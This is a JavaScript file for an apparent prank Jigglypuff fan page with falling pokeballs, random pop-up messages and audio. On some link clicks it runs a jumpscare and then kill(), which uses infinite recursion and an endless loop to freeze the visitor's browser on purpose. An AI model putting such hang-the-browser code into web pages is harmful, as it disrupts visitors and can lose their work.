var messages = [
    "Hi",
    "I love you",
    "May puff be with you",
    "Oooo look at how the puff jiggles",
    "These hugs are so nice",
    "I dream about your downfall",
    "Puff is not an eldritch deity ",
    "Puff and cthulu are definitely not friends",
    "I see you",
    "",
    "Watch out",
    "look behind you",
    "You have very nice femurs",
    "You smell different when you are asleep",
    "Jigglypuff is the balloon pokemon!",
    "Jigglypuff evolves into Wigglytuff when it has enough happiness and exposed to a moon stone",
    "Jigglypuff can use it's eyes to hypnotize people and other pokemon",
    "Jigglypuff Became A Fairy-Type In Generation 6",
    "75 Percent Of Jigglypuffs Are Female",
    "Jigglypuff Prefers To Live In Meadow-Like Locations",
    "Jigglypuff Has Green Eyes In Its Shiny Form",
    "None Of Jigglypuff's Evolutionary Line Evolve By Leveling Up",
    "My mom says I'm special",
    "I used to live in this little hippie town in ohio"
]
var hiddenBodyElements = {}
var audioPlayed = true;
var lastBallDirection = "right";
var newLink = "";


document.addEventListener('DOMContentLoaded', () => {
    document.getElementById("jumpscare-audio").load();
    checkInteraction();
});

function startPage() {
    addJumpscareToLinks();
    showAlert();
    //spawner amount, per spawner ball amount, delay between spawn
    spawnSpawners(10, 22, 100);
}

function spawnSpawners(spawnerAmount, ballAmount, delayInMS) {
    for (var i = 0; i < spawnerAmount; i++) {
        spawnBalls(ballAmount, delayInMS);
    }
}

function checkInteraction() {
    const audio = document.getElementById("main_song");
    audio.play()
    .catch(error => {
        displayEntryDiv();
        return Promise.reject();
    }).then(
        startPage,
        () => {}
    )
}

function hideBodyElements() {
    hiddenBodyElements = {}
    var elements = document.body.children;
    for (var i = 0; i < elements.length; i++) {
        if (elements[i].tagName == "SCRIPT") {
            continue;
        }
        hiddenBodyElements[elements[i].id] = window.getComputedStyle(elements[i]).display;
        elements[i].style.display = "none";
    }
}

function showBodyElements() {
    for (var elementId in hiddenBodyElements) {
        if (elementId == "") {
            continue;
        }
        var element = document.getElementById(elementId);
        element.style.display = hiddenBodyElements[elementId];
    }
}

function displayEntryDiv() {
    hideBodyElements();
    var newAlert = document.createElement('div');
    newAlert.classList.add("alert");
    newAlert.innerHTML = "Enter Page"
    newAlert.style.top = "calc(50% - 50px)";
    newAlert.style.left = "calc(50% - 100px)";
    newAlert.addEventListener("click", function() {
        this.remove();
        showBodyElements();
        startPage();
        document.getElementById("main_song").play();
    });
    document.body.appendChild(newAlert);
}

function showJumpscare() {
    const main = document.getElementsByTagName("main")[0];
    const nav = document.getElementsByTagName("nav")[0];
    var delay = getRandomJumpscareDelay();
    
    if (delay > 0) {
        console.log(delay)
        hideBodyElements();
        document.body.style.backgroundColor = "black";
        
        document.body.style.backgroundImage = "url('images/jump_scare.gif')";
        var audio = document.getElementById("jumpscare-audio");
        audio.autoplay = true;
        audio.addEventListener('playing', (event) => {
            wait(delay, 1).then(function() {
                return spawnKill();
            });
        });
        audio.play();        
    } else {
        goToNewLink(newLink);
    }
}

function wait(ms, val) {
    return new Promise(resolve => setTimeout(resolve, ms, val))
}


function spawnKill() {
    while (true) {
        kill();
    }
}

async function kill() {
    console.log("killing");
    kill();
    var a =""
    while (true) {
        a += "a";
    }
}


function goToNewLink() {
    if (window.location.href == newLink) {
        document.body.style.backgroundImage = "url('images/pokeballs_falling.gif')";
        showBodyElements();
        window.location.reload();
    } else {
        window.location.href = newLink;
    }
}


function getRandomJumpscareDelay() {
    if (Math.random() > 0.97) {
        return 500;
    } else {
        return 0;
    }
}


function spawnBall() {
    var img = document.createElement('img');
    img.src = "images/pokeball.png";
    img.style.top = getRandomY().toString() + "px";
    img.style.left = getRandomX().toString() + "px";
    img.classList.add("pokeball")
    document.body.appendChild(img);
    if (lastBallDirection == "right") {
        img.classList.add("falling_up");
        lastBallDirection = "up";
    } else if (lastBallDirection == "up") {
        img.classList.add("falling");
        lastBallDirection = "down";
    } else if (lastBallDirection == "down") {
        img.classList.add("crossing_left");
        lastBallDirection = "left";
    } else {
        img.classList.add("crossing");
        lastBallDirection = "right";
    }
    img.addEventListener('animationend', deleteBall);
}

async function spawnBalls(max, delay) {
    for (var i = 0; i < max; i++) {
        spawnBall();
        await new Promise(r => setTimeout(r, delay));
    }
}

function deleteBall() {
    this.remove();
    spawnBall();
}

function getRandomX() {
    var currentWidth = parseInt(document.body.clientWidth, 10);
    return Math.round(Math.random() * currentWidth);
}

function getRandomY() {
    var currentHeight = parseInt(document.body.clientHeight, 10);
    return Math.round(Math.random() * currentHeight);
}

function getAlertDelay() {
    return Math.round(Math.random() * 2_500) + 2_500;
    //return Math.round(Math.random() * 1_000) + 1_000;
}

async function showAlert() {
    await new Promise(r => setTimeout(r, getAlertDelay()));
    var message = messages[Math.floor(Math.random() * messages.length)];
    createAlert(message);
    //alert(message);
    
    showAlert();
}

function createAlert(message) {
    var newAlert = document.createElement('div');
    newAlert.classList.add("alert");
    newAlert.innerHTML = message
    newAlert.style.top = (getRandomY() - 100) + "px";
    newAlert.style.left = getRandomX() + "px";
    createAlertAudio(newAlert);
    newAlert.addEventListener("click", function() {
        this.remove();
    });
    document.body.appendChild(newAlert);
}

function createAlertAudio(newAlert) {
    var audio = document.createElement('audio');
    audio.autoplay = true;
    audio.type = "audio/mpeg";
    audio.src = "../audio/jiggly_taunt_smash.mp3";
    newAlert.appendChild(audio);
}